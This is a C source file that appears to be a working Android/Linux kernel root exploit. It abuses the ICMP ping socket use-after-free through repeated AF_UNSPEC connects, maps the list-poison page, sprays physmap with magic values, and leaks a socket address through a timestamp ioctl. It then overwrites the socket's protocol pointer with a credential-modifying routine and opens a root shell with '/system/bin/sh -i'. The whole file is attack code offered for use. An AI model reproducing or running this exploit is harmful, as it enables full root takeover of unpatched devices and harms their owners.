#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include  <fcntl.h> 
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include  <sys/stat.h>  
#include <sys/mman.h>
#include <stdint.h>
#include <linux/in.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/sysinfo.h>
#include <sys/resource.h>



#define CHILD_PROCESS         160
#define DEFAULT_RESERVE_SIZE    (64 * 1024 * 1024)
#define NSEC_PER_SEC            1000000000
#define ILL_SK_NUM 1010
#define FILL_OBJ  2048
#define MAP_SIZE 1024*1024*2
#define MMAP_BASE(x)    (((unsigned)(x)) & ~(MAP_SIZE - 1))
#define ADDR_ADD(p,n)           ((void *)((char *)(p) + (n)))
#define TIMESTAMP_MAGIC    0xffffffff
#define LIST_POISON2  0x00200200
#define PTMX_DEVICE "/dev/ptmx"
#define MAGIC_NUM(x) (0x0dead000|x)
extern void obtain_root_privilege_by_modify_task_cred(void);

#define ARRAY_SIZE(x)           (sizeof (x) / sizeof (*(x)))
#define OFFSET_SK_PROT          0x1c
#define OFFSET_SK_STAMP         0x150
#define OFFSET_MC_LIST          0x1cc


int ill_sock[ILL_SK_NUM]={-1};
void* phy_addr[FILL_OBJ];

struct status_t {
  int state;
  int sum;
};

struct vul_addr {
  unsigned int sk_addr;
  int sock;
} VUL_ADDR;



void close_ill_sk(int *sk){
  int i;
  for (i = 0; i < ILL_SK_NUM; ++i)
  { int sock = sk[i];
    close(sock);
  }
  printf("[+] ill sk freed %d\n", i);
}


int map_heal_sk(){
  int sk;                     /*s为socket描述符*/
  sk = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);//AF_UNSPEC,SOCK_DGRAM,IPPROTO_ICMP);    /*建立一个流式套接字 */
  if(sk < 0){                 /*出错*/
    return -1;
  }
  return sk;
}

void sick_sk(int sk){
  struct sockaddr_in server_addr; 
  bzero(&server_addr, sizeof(server_addr)); /*清零*/
  server_addr.sin_family = AF_INET;         /*协议族*/
  connect(sk, (struct sockaddr*)&server_addr, sizeof(server_addr));

  server_addr.sin_family = AF_UNSPEC;
  connect(sk, (struct sockaddr*)&server_addr, sizeof(server_addr));
  connect(sk, (struct sockaddr*)&server_addr, sizeof(server_addr));
}
static size_t
get_page_size(void)
{
  static size_t pagesize;

  if (pagesize == 0) {
    pagesize = sysconf(_SC_PAGESIZE);
  }

  return pagesize;
}


static int
lock_page_in_memory(void *address, size_t size)
{
  int ret;

  ret = mlock(address, size);
  if (ret != 0) {
    return -1;
  }

  return 0;
}

static void
populate_pagetable_for_address(void *address)
{
  *(void **)address = NULL;
}

static void *
protect_crash_when_double_free(void)
{
  void *address;
  size_t pagesize;

  pagesize = get_page_size();

  address = (void *)((LIST_POISON2 / pagesize) * pagesize);

  address =  mmap(address, pagesize,
                 PROT_READ | PROT_WRITE,
                 MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,
                 -1, 0);

  if (address == MAP_FAILED) {
    return NULL;
  }

  populate_pagetable_for_address(address);
  lock_page_in_memory(address, pagesize);

  return address;
}



void child_create_sock(int pipe_state){
  struct status_t send_status={0,0};
  int sk[ILL_SK_NUM];
  int i;
    for (i = 0; i < ILL_SK_NUM; ++i)
    {  
      sk[i] = map_heal_sk();
      if(sk[i]==-1){
        break;
      }
    }

    send_status.sum = i;
    send_status.state = 1;
    write(pipe_state, &send_status, sizeof send_status);
    //child_wait_to_close(sk,i);

}

static void
create_child(int *pipe_state,int* pid)
{
  struct status_t status={0,0};
  int pipe_fds[2];
  int ret;
  ret = pipe(pipe_fds);
  if (ret != 0) {
    perror("pipe()");
  }

  *pid = fork();
  if (*pid == -1) {
    perror("fork()");
    return;
  }

  if (*pid == 0) {
    child_create_sock(pipe_fds[1]);
    while(1){
      sleep(100);
    }
  }else{

  
  while(1){
    read(pipe_fds[0], &status, sizeof(status));
    if( status.state == 1){
       *pipe_state = status.sum;
       break;
    }
  }
  close(pipe_fds[0]);
  close(pipe_fds[1]);
}

}



void lifting(int* pid){
  int i;
  int pipe_state[CHILD_PROCESS];
  int sum = 0;
  for (i = 0; i < CHILD_PROCESS; ++i)
  {   
     create_child(&pipe_state[i],&pid[i]);
     sum += pipe_state[i];
  }
   printf("[+] lifting %d socks \n", sum);
}

void fill_main_sk(int *sk){
 int i = 0;
  for (; i < ILL_SK_NUM; ++i)
  {
    sk[i] = map_heal_sk(); //map_ill_sk();
  }
  printf("[+] main sk filled %d\n", i);
}

static void fill_map_whth_time_magic(void *address){
  unsigned int *p;
  unsigned int i,size;
  unsigned int higher;
  p = (unsigned int *)address;
  higher = (unsigned int)(((size_t)address&0xff00000000) >> 32);
  size = MAP_SIZE/sizeof(unsigned int);
  for(i=0;i<size/2;i++){
    *p = (unsigned long)p&0xffffffff;
    p++;
    *p = (unsigned int)MAGIC_NUM(higher);
    p++;
  }
}

static int search_magic(int *sk){
  struct timespec tv;
  uint64_t value;
  size_t high,low;
  int i ,ret;

  for (i = 0; i < ILL_SK_NUM; ++i)
  {   
    if(sk[i]==-1){
      break;
    } 
      ret = ioctl(sk[i],0x8907,(void *)&tv);
      if(ret !=0){
        continue;
      }
      value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
      high = (size_t)(value >> 32);
      low = (size_t)value&0xffffffffff;
      if((high&0xffffff00) == MAGIC_NUM(0)){
        VUL_ADDR.sk_addr = ((unsigned int)low)-OFFSET_SK_STAMP;
        VUL_ADDR.sock = sk[i];
        return 1;
      }
  }

  return 0;
}

int try_fill_sk(int* sk){
  struct sysinfo info;
  int reserve_size = DEFAULT_RESERVE_SIZE;
  void* vul;
  int i;
  int ret;
  int remain;
  for (i = 0; i < FILL_OBJ; ++i)
  {

      ret = sysinfo(&info);
      if (ret == 0) {
        remain = info.freeram;
         if (remain < reserve_size) {
             if (i < 4) {
                reserve_size = info.freeram;
              }
            
          break;
            }
       }
    vul =  mmap(NULL, MAP_SIZE,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
     if (vul == MAP_FAILED) {
         perror("mmap");
         return;
        }
      phy_addr[i] = vul;
      fill_map_whth_time_magic(vul);
      usleep(10);
        ret = search_magic(sk);
        if(ret != 0){
          return 1;
        }
    }
    return 0;
    
}




static void kill_all_child(int *pid){
  int i,status;
  for(i=0;i<CHILD_PROCESS;i++){
    if(!pid[i])
      continue;
    kill(pid[i],SIGQUIT);
    waitpid(pid[i],&status,0);
  }
  printf("[+] kill %d child done\n",i);
}

void sick_main_sk(int * sk){
 int i = 0;
  for (; i < ILL_SK_NUM; ++i)
  { 
    int sock = sk[i];
    sick_sk(sock);
  }
  printf("[+] sk infected %d\n", i);
}

void phy_unmap(){
  int i;
  for (i = 0; i < FILL_OBJ; ++i)
  {   if(!phy_addr[i])
        break;
     munmap(phy_addr[i], MAP_SIZE);
  }
}

int prepare_work(){
   int pid[CHILD_PROCESS];
  void *protect = NULL;
    protect = protect_crash_when_double_free();
      if (!protect) {
        printf("Error in protect_crash_when_double_free()\n");
        return 1;
      }
    lifting(pid);
    fill_main_sk(ill_sock);
    kill_all_child(pid);
    sick_main_sk(ill_sock);

    while(1){
    int ret = try_fill_sk(ill_sock);
    if(ret == 1){
      printf("[+] ill sk controled \n");
      break;
    }else{
      printf("[-] physmap failed\n");
      phy_unmap();
    }
  }
    return 0;

}

static int
setup_get_root()
{ 
  unsigned int * sk;
  sk = VUL_ADDR.sk_addr;
  static unsigned prot[256];
  unsigned *mmap_end_address;
  unsigned *p;
  int i;

  for (i = 0; i < ARRAY_SIZE(prot); i++) {
    prot[i] = (unsigned)obtain_root_privilege_by_modify_task_cred;
  }

  mmap_end_address = (void *)MMAP_BASE(sk) + MAP_SIZE - 1;

  for (i = OFFSET_MC_LIST - 32; i < OFFSET_MC_LIST + 32; i+= 4) {
    p = ADDR_ADD(sk, i);
    if (p > mmap_end_address) {
      break;
    }

    *p = 0;
  }

  for (i = OFFSET_SK_PROT - 32; i < OFFSET_SK_PROT + 32; i+= 4) {
    p = ADDR_ADD(sk, i);
    if (p > mmap_end_address) {
      break;
    }

    *p = (unsigned)prot;
  }
}

void get_root(){

  setup_get_root();
  int vul_sk = VUL_ADDR.sock;
  close(vul_sk);
  printf("[+] rooted\n");
  system("/system/bin/sh -i");
}




int main(int argc, const char *argv[]) {
    prepare_work();
    get_root();
    return 0;
}
